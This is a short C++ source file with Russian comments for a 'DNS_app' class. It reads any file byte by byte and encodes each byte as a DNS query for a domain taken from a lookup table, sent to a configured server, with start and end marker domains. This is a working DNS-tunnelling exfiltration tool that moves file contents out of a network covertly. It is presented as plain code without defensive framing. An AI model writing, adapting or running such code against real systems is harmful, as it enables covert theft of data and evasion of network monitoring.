#include "DNS_app.h"
#include <chrono>

DNS_app::DNS_app(std::string server_ip):    Server_IP(server_ip),
                                            db_name("test.txt")
{
    bayt_cripted(db_name); // Название файла с нумерованими IP
}

DNS_app::~DNS_app(){

}

// Загрузка базы данных доменов из файла в в хеш-таблицу
void DNS_app::bayt_cripted(const std::string& filename) {
    std::ifstream file(filename);
    std::string line;
    while (std::getline(file, line)) {
        std::istringstream iss(line);
        std::string domain,id;
        if (iss >> domain >> id) {
            hostnames[id] = domain;
        }
    }
}


/* Функция считывает один байт из бинарного файла,
  использует его как ключ для поиска в хеш-таблице,
  и отправляет запрос на домен, соответствующий найденному значению. */

void DNS_app::start_tr(std::string filename){
    std::ifstream file(filename, std::ios::binary);
    DNS_TR_C send(Server_IP);
    // Проверяем, удалось ли открыть файл
    if (!file.is_open()) {
        std::cerr << "Не удалось открыть файл!" << std::endl;
        return;
    }

    // Считываем файл по одному байту
    char byte;

    send.setDomain(hostnames["256"]);
    send.send_query();
    
    while (file.get(byte)) {
        // Выводим байт в виде целого числа
        send.setDomain(hostnames[std::to_string(static_cast<int>(static_cast<unsigned char>(byte)))]);
        send.send_query();
        send.resive_query();
        //std::chrono::microseconds t(10);
    }

    send.setDomain(hostnames["257"]);
    send.send_query();

    // Закрываем файл
    file.close();
    
    return;
}


void setServer_IP(const std::string& server_ip){
    std::string Server_IP = server_ip;
}